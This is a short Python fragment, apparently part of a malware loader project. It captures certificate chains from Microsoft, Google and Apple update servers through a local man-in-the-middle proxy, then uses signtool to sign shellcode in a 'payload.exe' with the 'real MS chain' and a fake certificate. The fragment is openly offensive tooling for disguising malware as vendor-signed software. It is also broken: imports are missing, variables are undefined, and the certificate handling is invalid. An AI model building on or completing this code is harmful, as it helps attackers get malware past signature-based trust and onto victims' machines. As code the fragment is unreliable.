# Add these functions to loaders.py
import mitmproxy, ssl, requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes

def extract_real_chains(vendor):
    """MITM legitimate updates to extract REAL cert chains"""
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    
    urls = {
        "microsoft": "https://windowsupdate.microsoft.com/v6/wsus3update3static.aspx",
        "google": "https://tools.google.com/service/update2",
        "apple": "https://swscan.apple.com/content/catalogs/others/index-1.merged-1.sucatalog.gz",
        # add others
    }
    
    mitmdump = subprocess.Popen(["mitmdump", "-s", "cert_extract.py", "-p", "8080"])
    time.sleep(2)
    
    chains = {}
    for url in urls.get(vendor, []):
        resp = requests.get(url, proxies=proxies, verify=False, timeout=10)
        chains[url] = resp.connection.sock.getpeercert(True)  # DER bytes
    
    mitmdump.terminate()
    return chains

def sign_with_real_chain(shellcode, cert_chain_pem, private_key_pem):
    """Dual-sign with real chain + fake cert"""
    # Authenticode signing with real MS chain
    subprocess.run(["signtool", "sign", "/f", cert_chain_pem, "/csp", "Microsoft Enhanced RSA", 
                   "/fd", "SHA256", "/tr", "http://timestamp.digicert.com", 
                   "/td", "SHA256", payload.exe])
